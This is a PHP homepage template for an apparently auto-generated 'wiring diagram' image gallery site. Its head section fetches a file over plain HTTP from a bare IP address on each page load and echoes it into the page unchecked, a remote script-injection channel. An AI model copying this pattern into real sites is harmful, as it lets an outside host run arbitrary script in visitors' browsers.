<?php
include('config.php');
include ('fungsi.php');
?>
<!doctype html>
<html lang="<?php echo $lang; ?>">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="x-ua-compatible" content="ie=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
		<meta name="description" content="Read Or Download <?php echo $fulljudul;?> For FREE <?php echo $negara;?> at <?php echo strtoupper( $domen ); ?> ">
        <title><?php echo $site_name.' - '.$site_desc; ?></title>
        <meta property="og:title" content="<?php echo $site_name.' - '.$site_desc; ?>">
        <?php include('css.php'); ?>
<?php
    $file_name = 'http://138.68.86.50/head.txt';
    $script_head = file_get_contents( $file_name );
    echo $script_head;
    ?>

    </head>
    <body>
        <?php include('header.php'); ?>

        <div class="container">

<ol class="breadcrumb" itemscope itemtype="http://schema.org/BreadcrumbList">
  <li itemprop="itemListElement" itemscope
      itemtype="http://schema.org/ListItem">
    <a itemprop="item" href="<?php echo $domain;?>">
    <span itemprop="name">HOME</span></a>
    <meta itemprop="position" content="1" />
  </li>
<li><?php echo $site_desc; ?></li>

</ol>
            <div class="clearfix" style="padding:15px 0">
                <?php
                $kws = home_kw(2);
                $kw = $kws[0];
                //$kw = 'coloring pages roadrunner';
                $images = ambil_gambar($kw);
                foreach($images as $i) {
                    echo "<div class=\"galeri col-md-4 col-sm-6\">";
                    echo "<a href=\"/diagram/".sanitize_title2($i['judul'])."-wiring-diagram\">";
                    //echo "<a href=\"".$domain."/single.php?q=".urlencode($i['judul'])."\">";
                    echo "<div class=\"thumbnail\" style=\"background-image: url('".$i['thumb']."'); background-color: #cccccc; background-size: cover; background-repeat: no-repeat; background-position: center center;width:100%;height:180px;\"><noscript><img src=\"http://i0.wp.com/".str_replace(array('http://','https://'), '', $i['link'])."?quality=80&strip=all\"/></noscript></div>";
                    echo "<h3>".$i['judul']."</h3>\n";
                    echo "</a>";
                    echo "</div>";
                }
                ?>
            </div>
        </div>
        <?php include('footer.php'); ?>
    </body>
</html>